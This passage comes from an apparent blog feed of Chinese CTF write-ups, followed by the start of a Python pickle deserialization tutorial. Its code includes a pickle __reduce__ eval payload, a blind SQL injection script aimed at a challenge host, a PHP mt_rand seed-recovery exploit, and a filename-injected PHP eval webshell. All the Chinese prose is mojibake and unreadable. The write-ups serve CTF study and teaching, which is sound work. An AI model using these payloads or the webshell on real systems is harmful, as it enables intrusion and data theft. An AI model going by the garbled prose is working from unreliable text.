class="hljs-number">0</span>)</code></pre><p>å½“<code>__reduce__</code>è¢«å®šä¹‰ä¹‹åï¼Œè¯¥å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨æˆ‘ä»¬è¿™é‡Œçš„evalç”¨äºé‡å»ºå¯¹è±¡çš„æ—¶å€™è°ƒç”¨ï¼Œå³å‘Šè¯‰pythonå¦‚ä½•pickleä»–ä»¬ä¾›evalä½¿ç”¨çš„å³æ‰“å¼€çš„æ–‡ä»¶flag.txt.<br>EXPï¼š</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> urllib<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span>(<span class="hljs-params">object</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))a = pickle.dumps(payload())a = urllib.quote(a)<span class="hljs-keyword">print</span> a</code></pre><p><img src="/2021/07/24/ikun/7.png" alt="7"></p><p>æŠ“åŒ…ä¼ å€¼</p><p><img src="/2021/07/24/ikun/6.png" alt="6"></p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12178311.html">https://www.cnblogs.com/wangtanzhi/p/12178311.html</a></p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a class="header-anchor" href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–">ğŸ­</a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><h4 id="phpç§å­ä¼ªéšæœºæ•°"><a class="header-anchor" href="#phpç§å­ä¼ªéšæœºæ•°">ğŸ­</a>phpç§å­ä¼ªéšæœºæ•°</h4><p><code>mt_scrand(seed)</code>å‡½æ•°é€šè¿‡åˆ†å‘seedç§å­ï¼Œé mt_rand()ç”Ÿæˆéšæœºæ•°ã€‚</p><img src="/2021/07/24/ikun/11.png" alt="11" style="zoom:50%;"><p>ä½†å­˜åœ¨ä¸¤æ¬¡éšæœºæ•°ä¸€æ ·çš„ï¼Œè¿™å°±æ˜¯ä¼ªéšæœºæ•°çš„æ¼æ´ï¼Œå­˜åœ¨å¯é¢„æµ‹æ€§ã€‚</p><h4 id="è§£é¢˜"><a class="header-anchor" href="#è§£é¢˜">ğŸ­</a>è§£é¢˜</h4><p>æŸ¥çœ‹æºç ï¼Œæç¤ºæœ‰check.php</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);session_start();<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;$_SESSION[<span class="hljs-string">&#x27;seed&#x27;</span>]=rand(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);   <span class="hljs-comment">//éšæœºæ•°è®¾ç½®session</span>&#125;mt_srand($_SESSION[<span class="hljs-string">&#x27;seed&#x27;</span>]);$str_long1 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;$str=<span class="hljs-string">&#x27;&#x27;</span>;$len1=<span class="hljs-number">20</span>;<span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(<span class="hljs-number">0</span>, strlen($str_long1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       &#125;$str_show = substr($str, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;num&#x27;</span>]===$str)&#123;x        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;    &#125;&#125;show_source(<span class="hljs-string">&quot;check.php&quot;</span>);</code></pre><p>ç»™äº†éšæœºæ•°åˆ—ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç§å­;å…ˆç”¨è„šæœ¬å°†ä¼ªéšæœºæ•°è½¬æ¢æˆphp_mt_seedå¯ä»¥è¯†åˆ«çš„æ•°æ®</p><pre><code class="hljs vim">str1=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>str2=<span class="hljs-string">&#x27;Ntkilw3DeO&#x27;</span>str3 = str1[::-<span class="hljs-number">1</span>]length = <span class="hljs-built_in">len</span>(str2)<span class="hljs-keyword">res</span>=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str2)):    <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str1)):        <span class="hljs-keyword">if</span> str2[i] == str1[<span class="hljs-keyword">j</span>]:            <span class="hljs-keyword">res</span>+=str(<span class="hljs-keyword">j</span>)+<span class="hljs-string">&#x27; &#x27;</span>+str(<span class="hljs-keyword">j</span>)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>+<span class="hljs-string">&#x27; &#x27;</span>+str(<span class="hljs-built_in">len</span>(str1)-<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27; &#x27;</span>            <span class="hljs-keyword">break</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">res</span>)</code></pre><p><img src="/2021/07/24/ikun/8.png" alt="8"></p><p>çˆ†ç ´ä¼ªéšæœºæ•°å’Œphpç‰ˆæœ¬</p><p><img src="/2021/07/24/ikun/9.png" alt="9"></p><p>sendå€¼ä¸º810236868ï¼Œç”¨éƒ¨åˆ†æºç ç”Ÿæˆå®Œæ•´å­—ç¬¦ä¸²ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>mt_srand(<span class="hljs-number">810236868</span>);$str_long1 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;$str=<span class="hljs-string">&#x27;&#x27;</span>;$len1=<span class="hljs-number">20</span>;<span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(<span class="hljs-number">0</span>, strlen($str_long1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       &#125;<span class="hljs-keyword">echo</span> $str;<span class="hljs-meta">?&gt;</span></code></pre><p>æäº¤å­—ç¬¦</p><p><img src="/2021/07/24/ikun/10.png" alt="10"></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_43801002/article/details/107760064">https://blog.csdn.net/qq_43801002/article/details/107760064</a></p><h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a class="header-anchor" href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb">ğŸ­</a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><ul><li>å¤‡ä»½æ–‡ä»¶æ³„éœ²</li><li>SQLæ³¨å…¥</li><li>phpçŸ­æ ‡ç­¾</li></ul><p>é€šè¿‡robots.txtå‘ç°å­˜åœ¨.bakå¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•åè·å–åˆ°image.php.bakæ–‡ä»¶ï¼Œä»£ç ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;$id=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;id&quot;</span>])?$_GET[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;$path=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;path&quot;</span>])?$_GET[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;$id=addslashes($id);$path=addslashes($path);$id=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,$id);$path=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,$path);$result=mysqli_query($con,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=<span class="hljs-string">&quot;./&quot;</span> . $row[<span class="hljs-string">&quot;path&quot;</span>];header(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);readfile($path);</code></pre><p>å¯¹å•å¼•å·è¿›è¡Œè¿‡æ»¤ï¼Œæ— æ³•é—­åˆå•å¼•å·ï¼Œå¯ä»¥ç”¨<code>\0</code>æ¥è½¬ä¹‰æ‰å®ƒçš„å•å¼•å·ã€‚è¾“å…¥<code>\0</code>ï¼Œç»è¿‡â€œaddslashesâ€å‡½æ•°ä¼šå…ˆå˜æˆ<code>\\0</code>,ç„¶åç»è¿‡â€œstr_replaceâ€å‡½æ•°ï¼Œä¼šå˜æˆ<code>\</code>,è¿™æ ·ï¼Œå°±æŠŠidåé¢çš„å•å¼•å·ç»™è½¬ä¹‰äº†ã€‚</p><pre><code class="hljs livecodeserver">import  requestsurl = <span class="hljs-string">&quot;http://52890d33-fd0d-4e31-9f0b-46921a22705b.node4.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span>payload = <span class="hljs-string">&quot;or id=if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><span class="hljs-built_in">result</span> = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):    l = <span class="hljs-number">1</span>    r = <span class="hljs-number">130</span>    <span class="hljs-keyword">mid</span> = (l + r)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(l&lt;r):        payloads = payload.<span class="hljs-built_in">format</span>(i,<span class="hljs-keyword">mid</span>)        print(url+payloads)        html = requests.<span class="hljs-built_in">get</span>(url+payloads)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> html.<span class="hljs-keyword">text</span>:            l = <span class="hljs-keyword">mid</span> +<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            r = <span class="hljs-keyword">mid</span>        <span class="hljs-keyword">mid</span> = (l + r)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-built_in">result</span>+=chr(<span class="hljs-keyword">mid</span>)    print(<span class="hljs-built_in">result</span>)</code></pre><p>è„šæœ¬æ³¨å‡ºè´¦å·å’Œå¯†ç </p><p><img src="/2021/07/24/ikun/13.png" alt="13"></p><p>ç™»å½•åæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œéšä¾¿ä¼ ä¸€å¼ å›¾ç‰‡å‘ç°ä¼šå°†æ–‡ä»¶åå’Œç”¨æˆ·åå†™å…¥æ—¥å¿—æ–‡ä»¶ã€‚ä½†æ˜¯è¿™é‡Œæ—¥å¿—æ–‡ä»¶ä¸ºphpæ ¼å¼ï¼Œè€ƒè™‘å†™å…¥shellã€‚ç”±äºç”¨æˆ·ååªèƒ½ä¸ºadminæ— æ³•åˆ©ç”¨ï¼Œè€ƒè™‘æ–‡ä»¶åæ³¨å…¥ã€‚æ–‡ä»¶åè¿›è¡Œäº†phpè¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼š</p><pre><code class="hljs php-template"><span class="xml">filename=&quot;</span><span class="php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span></code></pre><p><img src="/2021/07/24/ikun/12.png" alt="12"></p><p>èšå‰‘è¿æ¥</p><p><img src="/2021/07/24/ikun/14.png" alt="14"></p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12253918.html">https://www.cnblogs.com/wangtanzhi/p/12253918.html</a></p>]]></content>
    
    
    <categories>
      
      <category>pythonååºåˆ—åŒ–</category>
      
      <category>phpä¼ªéšæœºæ•°æ¼æ´</category>
      
      <category>åˆ·é¢˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python Pickleååºåˆ—åŒ–æ¼æ´</title>
    <link href="/2021/07/23/pickle/"/>
    <url>/2021/07/23/pickle/</url>
    
    <content type="html"><![CDATA[<h2 id="Python-åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a class="header-anchor" href="#Python-åºåˆ—åŒ–ä¸ååºåˆ—åŒ–">ğŸ­</a>Python åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><h3 id="Pickle-CPickleæ¨¡å—"><a class="header-anchor" href="#Pickle-CPickleæ¨¡å—">ğŸ­</a>Pickle/CPickleæ¨¡å—</h3><p>åœ¨ Python ä¸­ , åŒ…å«åºåˆ—åŒ–/ååºåˆ—åŒ–è¿‡ç¨‹çš„åº“æœ‰ <strong><code>Jsonæ¨¡å—</code></strong> , <strong><code>Pickle/CPickleæ¨¡å—</code></strong> , <strong><code>Shelveæ¨¡å—</code></strong> , <strong><code>Marshalæ¨¡å—</code></strong> ç­‰ , æˆ‘ä»¬ä¸»è¦æ¥çœ‹ <code>Pickle/CPickleæ¨¡å—</code>ã€‚<code>pickle</code>å’Œ<code>cPickle</code>çš„ä½œç”¨å’ŒPHPçš„<code>serializeä¸unserialize</code>ä¸€æ ·ï¼Œä¸¤è€…åªæ˜¯å®ç°çš„è¯­è¨€ä¸åŒï¼Œä¸€ä¸ªæ˜¯çº¯Pythonå®ç°ã€å¦ä¸€ä¸ªæ˜¯Cå®ç°ï¼Œå‡½æ•°è°ƒç”¨åŸºæœ¬ç›¸åŒã€‚</p><h3 id="Pickleåº“åŠå‡½æ•°"><a class="header-anchor" href="#Pickleåº“åŠå‡½æ•°">ğŸ­</a>Pickleåº“åŠå‡½æ•°</h3><blockquote><p>pickleæ¨¡å—æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼åºåˆ—åŒ–åä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼ˆä¿å­˜æ–‡ä»¶çš„åç¼€ä¸º<code>.pkl</code>ï¼‰ï¼Œä¸èƒ½ç›´æ¥æ‰“å¼€è¿›è¡Œé¢„è§ˆã€‚</p></blockquote><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>dumps</td><td>å¯¹è±¡ååºåˆ—åŒ–ä¸ºbyteså¯¹è±¡</td></tr><tr><td>dump</td><td>å¯¹è±¡ååºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡ï¼Œå­˜å…¥æ–‡ä»¶</td></tr><tr><td>loads</td><td>ä»byteså¯¹è±¡ååºåˆ—åŒ–</td></tr><tr><td>load</td><td>å¯¹è±¡ååºåˆ—åŒ–ï¼Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</td></tr></tbody></table><blockquote><p>dump(åºåˆ—åŒ–)</p><blockquote><pre><code class="hljs fortran">&gt;pickle<span class="hljs-number">.</span>dump(obj, <span class="hljs-keyword">file</span>, protocol=<span class="hljs-keyword">None</span>,)</code></pre><p>objè¡¨ç¤ºè¦è¿›è¡Œå°è£…çš„å¯¹è±¡(å¿…å¡«å‚æ•°ï¼‰;fileè¡¨ç¤ºobjè¦å†™å…¥çš„æ–‡ä»¶å¯¹è±¡,ä»¥äºŒè¿›åˆ¶å¯å†™æ¨¡å¼æ‰“å¼€å³wb(å¿…å¡«å‚æ•°ï¼‰</p></blockquote></blockquote><blockquote><p>loadï¼ˆååºåˆ—åŒ–ï¼‰</p><blockquote><pre><code class="hljs routeros">&gt;pickle.load(file, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>, <span class="hljs-attribute">buffers</span>=None)</code></pre><p>fileæ–‡ä»¶ä¸­è¯»å–å°å­˜åçš„å¯¹è±¡ä»¥äºŒè¿›åˆ¶å¯è¯»æ¨¡å¼æ‰“å¼€å³rb(å¿…å¡«å‚æ•°)</p></blockquote></blockquote><p>å®ä¾‹ï¼š</p><p><img src="/2021/07/23/pickle/1.png" alt="1"></p><p>ï¼ˆæ‘˜è‡ª<strong>Epicccal</strong>å¸ˆå‚…å®ä¾‹ï¼‰</p><p>åŸå§‹çš„ Python ç±»å¯¹è±¡å’Œååºåˆ—åŒ–ç”Ÿæˆçš„ Python ç±»å¯¹è±¡æ˜¯å®Œå…¨ç›¸åŒã€‚</p><blockquote><p>dumps</p><blockquote><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>pickle.dumps(obj, protocol=None,*,fix_imports=True)</code></pre><p>dumps()æ–¹æ³•ä¸éœ€è¦å†™å…¥æ–‡ä»¶ä¸­ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„byteså¯¹è±¡ã€‚</p></blockquote></blockquote><blockquote><p>loads</p><blockquote><pre><code class="hljs routeros">&gt;&gt;pickle.loads(bytes_object, *,<span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>. <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>)</code></pre><p>loads()æ–¹æ³•æ˜¯ç›´æ¥ä»byteså¯¹è±¡ä¸­è¯»å–åºåˆ—åŒ–çš„ä¿¡æ¯ï¼Œè€Œéä»æ–‡ä»¶ä¸­è¯»å–ã€‚</p></blockquote></blockquote><p>å®ä¾‹ï¼š</p><p><img src="/2021/07/23/pickle/2.png" alt="2"></p><p>ï¼ˆæ‘˜è‡ª<strong>Epicccal</strong>å¸ˆå‚…å®ä¾‹ï¼‰</p><p>æ¥ä¸‹æ¥å°±è¦æ¶‰åŠåˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯æŒ‰ç…§ä»€ä¹ˆè§„åˆ™ç”Ÿæˆ</p><h3 id="PVM-Python-Virtual-Machine-Python-è™šæ‹Ÿæœº"><a class="header-anchor" href="#PVM-Python-Virtual-Machine-Python-è™šæ‹Ÿæœº">ğŸ­</a>PVM( <code>Python Virtual Machine</code> , Python è™šæ‹Ÿæœº )</h3><h4 id="PVM-çš„ä½œç”¨"><a class="header-anchor" href="#PVM-çš„ä½œç”¨">ğŸ­</a><strong><code>PVM</code></strong> çš„ä½œç”¨</h4><p>åœ¨ä½¿ç”¨ <strong><code>C , C++</code></strong> ç­‰ç¼–è¯‘æ€§è¯­è¨€ç¼–å†™çš„ç¨‹åºæ—¶ ,  è§£é‡Šå™¨éœ€è¦å…ˆå°†æºä»£ç ç¼–è¯‘ ==&gt;é“¾æ¥ ==&gt;æ‰§è¡Œä½†æ˜¯å¯¹äº Python è€Œè¨€ , å®ƒå¯ä»¥ç›´æ¥ä»æºä»£ç è¿è¡Œç¨‹åº . Pythonè§£é‡Šå™¨ä¼šå°†æºä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç  , ç„¶åå°†ç¼–è¯‘åçš„å­—èŠ‚ç è½¬å‘åˆ°Python è™šæ‹Ÿæœºä¸­æ‰§è¡Œ ã€‚æ‰€ä»¥PVM æ˜¯ä¸€ä¸ªç”¨æ¥è§£é‡Šå­—èŠ‚ç çš„è§£é‡Šå¼•æ“ã€‚</p><h4 id="PVM-çš„å·¥ä½œæµç¨‹"><a class="header-anchor" href="#PVM-çš„å·¥ä½œæµç¨‹">ğŸ­</a><strong><code>PVM</code></strong> çš„å·¥ä½œæµç¨‹</h4><ul><li><p><strong>PVM ä¼šå…ˆæŠŠæºä»£ç ç¼–è¯‘æˆå­—èŠ‚ç </strong> .</p><p>å­—èŠ‚ç æ˜¯ Python è¯­è¨€ç‰¹æœ‰çš„ä¸€ç§è¡¨ç°å½¢å¼ , å®ƒä¸æ˜¯äºŒè¿›åˆ¶æœºå™¨ç  , éœ€è¦è¿›ä¸€æ­¥ç¼–è¯‘æ‰èƒ½è¢«æœºå™¨æ‰§è¡Œ . å¦‚æœ Python è¿›ç¨‹åœ¨ä¸»æœºä¸Šæœ‰å†™å…¥æƒé™ , é‚£ä¹ˆå®ƒä¼šæŠŠç¨‹åºå­—èŠ‚ç ä¿å­˜ä¸ºä¸€ä¸ªä»¥ <strong><code>.pyc</code></strong> ä¸ºæ‰©å±•åçš„æ–‡ä»¶ . å¦‚æœæ²¡æœ‰å†™å…¥æƒé™ , åˆ™ Python è¿›ç¨‹ä¼šåœ¨å†…å­˜ä¸­ç”Ÿæˆå­—èŠ‚ç  , åœ¨ç¨‹åºæ‰§è¡Œç»“æŸåè¢«è‡ªåŠ¨ä¸¢å¼ƒ .ä¸€èˆ¬æ¥è¯´ , åœ¨æ„å»ºç¨‹åºæ—¶æœ€å¥½ç»™ Python è¿›ç¨‹åœ¨ä¸»æœºä¸Šçš„å†™å…¥æƒé™ , è¿™æ ·åªè¦æºä»£ç æ²¡æœ‰æ”¹å˜ , ç”Ÿæˆçš„ <strong><code>.pyc</code></strong> æ–‡ä»¶å°±å¯ä»¥è¢«é‡å¤åˆ©ç”¨ , æé«˜æ‰§è¡Œæ•ˆç‡ , åŒæ—¶éšè—æºä»£ç  ã€‚</p></li><li><p><strong>ç„¶å , Python è¿›ç¨‹ä¼šæŠŠç¼–è¯‘å¥½çš„å­—èŠ‚ç è½¬å‘åˆ° PVM( Python è™šæ‹Ÿæœº ) ä¸­</strong> , PVMä¼šå¾ªç¯è¿­ä»£æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤ , ç›´åˆ°æ‰€æœ‰æ“ä½œè¢«å®Œæˆ ã€‚</p></li></ul><h4 id="PVM-çš„ç»“æ„"><a class="header-anchor" href="#PVM-çš„ç»“æ„">ğŸ­</a><strong><code>PVM</code></strong> çš„ç»“æ„</h4><p>Pickleæ˜¯ä¸€é—¨åŸºäºæ ˆçš„ç¼–ç¨‹è¯­è¨€ , æœ‰ä¸åŒçš„ç¼–å†™æ–¹å¼ , å…¶æœ¬è´¨å°±æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ PVM .</p><p>è½»é‡çº§çš„ PVM ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p><ul><li><p><strong>æŒ‡ä»¤å¤„ç†å™¨( Instruction processor )</strong></p><p>ä»æ•°æ®æµä¸­è¯»å–æ“ä½œç å’Œå‚æ•° , å¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç† . æŒ‡ä»¤å¤„ç†å™¨ä¼šå¾ªç¯æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ , ä¸æ–­æ”¹å˜ stack å’Œ memo åŒºåŸŸçš„å€¼ . ç›´åˆ°é‡åˆ° &quot; <strong><code>.</code></strong> &quot; è¿™ä¸ªç»“æŸç¬¦å· . è¿™æ—¶ , æœ€ç»ˆåœç•™åœ¨æ ˆé¡¶çš„çš„å€¼å°†ä¼šè¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å› .</p></li><li><p><strong>æ ˆåŒº( stack )</strong></p><p>ç”± Python çš„åˆ—è¡¨( list )å®ç° , ä½œä¸ºæµæ•°æ®å¤„ç†è¿‡ç¨‹ä¸­çš„æš‚å­˜åŒº , åœ¨ä¸æ–­çš„è¿›å‡ºæ ˆè¿‡ç¨‹ä¸­å®Œæˆå¯¹æ•°æ®æµçš„ååºåˆ—åŒ–æ“ä½œï¼Œå¹¶æœ€ç»ˆåœ¨æ ˆé¡¶ç”Ÿæˆååºåˆ—åŒ–çš„ç»“æœ</p></li><li><p><strong>æ ‡ç­¾åŒº( memo )</strong></p><p>ç”± Python çš„å­—å…¸( dict )å®ç° , å¯ä»¥çœ‹ä½œæ˜¯æ•°æ®ç´¢å¼•æˆ–è€…æ ‡è®° , ä¸º PVM çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨åŠŸèƒ½ .</p></li></ul><p>Pickle åœ¨åºåˆ—åŒ–æ—¶æœ€å¸¸ç”¨åˆ°çš„æ“ä½œç ï¼ˆæŒ‡ä»¤é›†ï¼‰ï¼š</p><pre><code class="hljs ada">c : è¯»å–æœ¬è¡Œçš„å†…å®¹ä½œä¸ºæ¨¡å—å( <span class="hljs-type">module</span> ) , è¯»å–ä¸‹ä¸€è¡Œçš„å†…å®¹ä½œä¸ºå¯¹è±¡å( object ) . ç„¶åå°† module.object ä½œä¸ºå¯è°ƒç”¨å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­( : å°†ä¸€ä¸ªæ ‡è®°å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­ , ç”¨äºç¡®å®šå‘½ä»¤æ‰§è¡Œçš„ä½ç½® . è¯¥æ ‡è®°å¸¸å¸¸æ­é… <span class="hljs-type">t</span> æŒ‡ä»¤ä¸€èµ·ä½¿ç”¨ , ä»¥ä¾¿äº§ç”Ÿä¸€ä¸ªå…ƒç»„S : åé¢è·Ÿå­—ç¬¦ä¸² , <span class="hljs-type">PVM</span>ä¼šè¯»å–å¼•å·ä¸­çš„å†…å®¹ , ç›´åˆ°é‡è§æ¢è¡Œç¬¦ , ç„¶åå°†è¯»å–åˆ°çš„å†…å®¹å‹å…¥åˆ°æ ˆä¸­t : ä»æ ˆä¸­ä¸æ–­å¼¹å‡ºæ•°æ® , å¼¹å°„é¡ºåºä¸å‹æ ˆæ—¶ç›¸åŒ , ç›´åˆ°å¼¹å‡ºå·¦æ‹¬å· . æ­¤æ—¶å¼¹å‡ºçš„å†…å®¹å½¢æˆäº†ä¸€ä¸ªå…ƒç»„ , ç„¶å , è¯¥å…ƒç»„ä¼šè¢«å‹å…¥æ ˆä¸­ .R : å°†ä¹‹å‰å‹å…¥æ ˆä¸­çš„å…ƒç»„å’Œå¯è°ƒç”¨å¯¹è±¡å…¨éƒ¨å¼¹å‡º , ç„¶åå°†è¯¥å…ƒç»„ä½œä¸ºå¯è°ƒç”¨å‚æ•°çš„å¯¹è±¡å¹¶æ‰§è¡Œè¯¥å¯¹è±¡  .æœ€åå°†ç»“æœå‹å…¥åˆ°æ ˆä¸­ .. : ç»“æŸæ•´ä¸ª <span class="hljs-type">Pickle</span> ååºåˆ—åŒ–è¿‡ç¨‹ .</code></pre><h4 id="åºåˆ—åŒ–è¿‡ç¨‹"><a class="header-anchor" href="#åºåˆ—åŒ–è¿‡ç¨‹">ğŸ­</a>åºåˆ—åŒ–è¿‡ç¨‹</h4><ol><li><strong>ä»å¯¹è±¡ä¸­æå–æ‰€æœ‰å±æ€§</strong></li><li><strong>å†™å…¥å¯¹è±¡çš„æ‰€æœ‰æ¨¡å—åå’Œç±»å</strong></li><li><strong>å†™å…¥å¯¹è±¡æ‰€æœ‰å±æ€§çš„é”®å€¼å¯¹</strong></li></ol><p>ä»¥ä¸Šå®ä¾‹å‰–æï¼š</p><p><img src="/2021/07/23/pickle/3.png" alt="3"></p><h2 id="ä¸-PHP-ååºåˆ—åŒ–çš„å¯¹æ¯”"><a class="header-anchor" href="#ä¸-PHP-ååºåˆ—åŒ–çš„å¯¹æ¯”">ğŸ­</a>ä¸ PHP ååºåˆ—åŒ–çš„å¯¹æ¯”</h2><p>ç›¸æ¯”äº PHP ååºåˆ—åŒ–å¿…é¡»è¦ä¾èµ–äºå½“å‰ä»£ç ä¸­ç±»çš„å­˜åœ¨ä»¥åŠæ–¹æ³•çš„å­˜åœ¨ï¼ŒPython å½»åº•çš„é¢å‘å¯¹è±¡çš„ç‰¹æ€§ååˆ†ä¼˜è¶Šï¼ŒPython  é™¤äº†èƒ½ååºåˆ—åŒ–å½“å‰ä»£ç 